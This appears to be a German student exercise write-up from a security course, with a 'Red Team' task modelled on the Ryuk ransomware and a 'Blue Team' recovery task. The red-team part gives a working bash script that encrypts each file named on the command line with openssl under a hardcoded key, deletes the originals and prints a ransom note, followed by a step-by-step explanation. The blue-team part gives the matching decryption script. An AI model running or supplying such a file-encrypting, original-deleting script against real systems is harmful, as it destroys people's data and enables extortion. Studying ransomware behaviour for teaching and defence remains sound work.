## Übung 1.2 Ryuk - Red Team
Red Team = Angreifer        
Erstelle ein bash Script das mehrere Dateinamen als Argumente akzeptiert und diese Dateien nach der von Ryuk angewendeten Strategie verschlüsselt. Verwende openssl.        
Z.B. alle Dateien im Verzeichnis verschlüsseln:         
$ ryuk_ransom *        
Nach dem Verschlüsseln aller Daten soll eine furchterregende "Ransom Note" ausgegeben    

### Skript: 

```sh 
#!/bin/bash
 
# Prüfe ob Argumente vorhanden sind
if [ $# -eq 0 ]; then
   echo "Verwendung: $0 <datei1> <datei2> ..."
   exit 1
fi
 
ENCRYPTION_KEY="MySecretKey12345"
encrypted_count=0
 
# Verschlüssele jede Datei
for file in "$@"; do
   if [ -f "$file" ]; then
       openssl enc -aes-256-cbc -salt -in "$file" -out "$file.encrypted" -k "$ENCRYPTION_KEY" 2>/dev/null
       rm "$file"
       ((encrypted_count++))
   fi
done
 
# Ransom Note
echo ""
echo "============================================"
echo "IHRE DATEIEN WURDEN VERSCHLUESSELT!"
echo "============================================"
echo "Kontaktieren Sie: ransom@darknet.onion"
echo ""
echo "$encrypted_count Datei(en) verschluesselt."
echo "============================================"
```

### Erklärung: was macht das file: 
Am Anfang prüft das Script, ob du es mit Dateien aufgerufen wird. Man gibst dem Script Dateinamen mit, z.B. ./ryuk_ransom datei1.txt datei2.txt. Wenn du das Script ohne Dateien startest, zeigt es eine Fehlermeldung und beendet sich. Das verhindert, dass das Script einfach so läuft, ohne etwas zu tun.
 
Dann definiert das Script Variablen. Der ENCRYPTION_KEY ist das Passwort MySecretKey12345, das zur Verschlüsselung benutzt wird. Der encrypted_count ist einfach ein Zähler, der angibt, wie viele Dateien am Ende verschlüsselt wurden.
 
Jetzt kommt die Hauptschleife. Das Script geht jede Datei durch, die man übergeben hat. Zuerst prüft es, ob die Datei wirklich existiert.
 
Die Verschlüsselung selbst passiert mit OpenSSL. Der Befehl openssl enc -aes-256-cbc bedeutet: Verschlüssel die Datei mit der AES-256-CBC Methode. Der -in Parameter gibt an, welche Datei verschlüsselt werden soll, und -out sagt, wo die neue Datei gespeichert werden soll - nämlich mit der Endung .encrypted. Das -k Parameter übergibt das Passwort. Der -salt Parameter macht die Verschlüsselung noch sicherer, indem es Zufallsdaten hinzufügt.
 
Nach der Verschlüsselung löscht das Script die Original-Datei mit dem rm Befehl. Die Datei, die man ursprünglich hatte, wird gelöscht und nur die verschlüsselte Version bleibt übrig. Jetzt kann man die Datei ohne das Passwort nicht mehr öffnen.
 
Am Ende zeigt das Script eine Ransom Note an. 
Der Zähler wird nach jeder erfolgreichen Verschlüsselung um 1 erhöht, sodass am Ende angezeigt wird, wie viele Dateien insgesamt verschlüsselt wurden.

## Übung 1.3 (Ryuk - Blue Team)

``sh
#!/bin/bash
 
if [ $# -eq 0 ]; then

   echo "Verwendung: $0 <datei1.encrypted> <datei2.encrypted> ..."

   exit 1

fi
 
ENCRYPTION_KEY="MySecretKey12345"

decrypted_count=0
 
for encrypted_file in "$@"; do

   if [ -f "$encrypted_file" ]; then

       original_file="${encrypted_file%.encrypted}"

       openssl enc -aes-256-cbc -d -in "$encrypted_file" -out "$original_file" \

                   -k "$ENCRYPTION_KEY" 2>/dev/null

       ((decrypted_count++))

       echo "✓ $original_file wiederhergestellt"

   fi

done
 
echo ""

echo "============================================"

echo "✓ $decrypted_count Datei(en) entschlüsselt!"

echo "============================================"
`` 

### Erklärung: was macht das file: 
Das Script nimmt verschlüsselte Dateien und macht sie wieder lesbar. Zuerst prüft es, ob man überhaupt Dateien übergeben hat, sonst bricht es ab. 
Dann geht es alle übergebenen Dateien durch und prüft, ob sie existieren. Für jede Datei wird die .encrypted Endung vom Namen entfernt und benutzt OpenSSL mit dem Passwort MySecretKey12345, um die Datei zu entschlüsseln. 
Das -d Flag bei OpenSSL bedeutet "decrypt" (entschlüsseln). 
Am Ende zeigt es an, wie viele Dateien erfolgreich entschlüsselt wurden, und gibt eine Meldung aus.
